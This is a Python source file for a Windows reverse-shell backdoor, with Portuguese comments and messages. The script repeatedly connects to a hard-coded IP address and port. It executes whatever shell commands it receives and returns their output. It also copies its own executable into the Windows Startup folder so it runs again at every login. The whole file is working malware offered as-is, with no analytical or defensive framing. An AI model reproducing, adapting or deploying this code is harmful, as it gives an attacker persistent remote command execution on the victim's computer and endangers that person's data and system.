import socket
import time
import subprocess
import threading
import os

IP = '192.168.0.101'
PORT = 3333

def autorun():
    filename = os.path.basename(__file__)
    exe_filename = filename.replace(".py", ".exe")
    print(filename)
    os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programas\\StartUp\"".format(exe_filename))

def connect(IP, PORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((IP, PORT))
        print('Conectado')
        return client
    except Exception as ERROR:
        print('ERROR: ', ERROR)
        

def listen(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()
            if data == '/exit':
                return
            else:
                threading.Thread(target=cmd, args=(client, data)).start()
                #cmd(client, data)

    except Exception as Error:
        print('ERRO: ', Error)
        client.close()

def cmd(client, data):
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output, errors = proc.communicate()  # Lê a saída e os erros
        if errors:
            client.send(errors)  # Envia erros em bytes
        else:
            client.send(output)  # Envia a saída em bytes
    except Exception as Error:
        print('ERROR: ', Error)

if __name__ == '__main__':
    autorun()
    while True:
        client = connect(IP, PORT)
        if client:
            listen(client)
        else:
            print('Deu erro na conexão, tentando novamente...')
            time.sleep(3)
